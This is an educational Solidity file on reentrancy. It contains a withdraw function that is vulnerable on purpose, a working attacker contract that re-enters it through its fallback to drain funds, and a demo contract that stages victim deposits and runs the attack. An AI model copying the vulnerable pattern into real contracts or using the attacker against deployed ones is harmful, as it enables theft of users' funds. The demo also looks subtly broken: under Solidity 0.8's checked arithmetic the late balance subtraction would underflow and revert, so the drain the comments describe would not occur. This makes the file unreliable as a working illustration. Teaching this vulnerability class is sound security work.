// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title ReentrancyVulnerable
 * @dev VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * 
 * This contract demonstrates a classic reentrancy vulnerability.
 * The withdraw function makes an external call before updating the state,
 * allowing an attacker to recursively call withdraw and drain the contract.
 * 
 * VULNERABILITY: External call before state update
 * ATTACK VECTOR: Malicious contract with fallback function calling withdraw
 * IMPACT: Complete drainage of contract funds
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @dev Allows users to deposit Ether into the contract
     */
    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev VULNERABLE: Withdraw function susceptible to reentrancy attack
     * 
     * The vulnerability exists because:
     * 1. We check the balance (require statement)
     * 2. We make an external call (msg.sender.call)
     * 3. We update the state AFTER the external call
     * 
     * An attacker can exploit this by:
     * 1. Depositing some amount
     * 2. Calling withdraw from a malicious contract
     * 3. In the fallback function, calling withdraw again
     * 4. Repeating until the contract is drained
     */
    function withdraw(uint256 amount) external {
        // Check: Verify user has sufficient balance
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Interaction: External call BEFORE state update (VULNERABLE)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // Effect: State update AFTER external call (TOO LATE)
        balances[msg.sender] -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev Get the contract's total balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Get user's balance
     */
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

/**
 * @title ReentrancyAttacker
 * @dev Malicious contract that exploits the reentrancy vulnerability
 * 
 * This contract demonstrates how an attacker would exploit the vulnerable contract:
 * 1. Deploy this attacker contract
 * 2. Call attack() with some Ether
 * 3. The contract deposits and then withdraws
 * 4. During withdrawal, the fallback function is triggered
 * 5. The fallback function calls withdraw again
 * 6. This continues until the vulnerable contract is drained
 */
contract ReentrancyAttacker {
    ReentrancyVulnerable public vulnerableContract;
    uint256 public attackAmount;
    
    event AttackStarted(uint256 amount);
    event AttackStep(uint256 step, uint256 contractBalance);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address _vulnerableContract) {
        vulnerableContract = ReentrancyVulnerable(_vulnerableContract);
    }
    
    /**
     * @dev Initiates the reentrancy attack
     * @param _attackAmount The amount to use for the initial deposit and withdrawal
     */
    function attack(uint256 _attackAmount) external payable {
        require(msg.value >= _attackAmount, "Insufficient Ether sent");
        require(_attackAmount > 0, "Attack amount must be greater than 0");
        
        attackAmount = _attackAmount;
        
        emit AttackStarted(_attackAmount);
        
        // Step 1: Deposit the attack amount
        vulnerableContract.deposit{value: _attackAmount}();
        
        // Step 2: Start the reentrancy attack
        vulnerableContract.withdraw(_attackAmount);
        
        emit AttackCompleted(address(this).balance);
    }
    
    /**
     * @dev Fallback function that gets called during the external call in withdraw
     * This is where the reentrancy happens
     */
    fallback() external payable {
        uint256 contractBalance = vulnerableContract.getContractBalance();
        
        emit AttackStep(gasleft(), contractBalance);
        
        // Continue the attack if there's still money in the contract
        // and we have enough gas
        if (contractBalance >= attackAmount && gasleft() > 40000) {
            vulnerableContract.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev Allows the attacker to withdraw stolen funds
     */
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    /**
     * @dev Get the attacker contract's balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Allow the contract to receive Ether
     */
    receive() external payable {}
}

/**
 * @title ReentrancyDemo
 * @dev Helper contract to demonstrate the attack scenario
 */
contract ReentrancyDemo {
    ReentrancyVulnerable public vulnerableContract;
    ReentrancyAttacker public attackerContract;
    
    event DemoSetup(address vulnerableContract, address attackerContract);
    event VictimDeposit(address victim, uint256 amount);
    event AttackExecuted(uint256 stolenAmount);
    
    constructor() {
        // Deploy the vulnerable contract
        vulnerableContract = new ReentrancyVulnerable();
        
        // Deploy the attacker contract
        attackerContract = new ReentrancyAttacker(address(vulnerableContract));
        
        emit DemoSetup(address(vulnerableContract), address(attackerContract));
    }
    
    /**
     * @dev Simulates innocent users depositing funds
     */
    function simulateVictimDeposits() external payable {
        require(msg.value >= 3 ether, "Need at least 3 ETH for demo");
        
        // Simulate 3 different users depositing
        vulnerableContract.deposit{value: 1 ether}();
        emit VictimDeposit(address(0x1), 1 ether);
        
        vulnerableContract.deposit{value: 1 ether}();
        emit VictimDeposit(address(0x2), 1 ether);
        
        vulnerableContract.deposit{value: 1 ether}();
        emit VictimDeposit(address(0x3), 1 ether);
    }
    
    /**
     * @dev Executes the reentrancy attack
     */
    function executeAttack() external payable {
        require(msg.value >= 0.5 ether, "Need at least 0.5 ETH for attack");
        
        uint256 balanceBefore = attackerContract.getBalance();
        
        // Execute the attack
        attackerContract.attack{value: 0.5 ether}(0.5 ether);
        
        uint256 balanceAfter = attackerContract.getBalance();
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        emit AttackExecuted(stolenAmount);
    }
    
    /**
     * @dev Get contract states for analysis
     */
    function getContractStates() external view returns (
        uint256 vulnerableBalance,
        uint256 attackerBalance,
        uint256 attackerDepositBalance
    ) {
        vulnerableBalance = vulnerableContract.getContractBalance();
        attackerBalance = attackerContract.getBalance();
        attackerDepositBalance = vulnerableContract.getBalance(address(attackerContract));
    }
}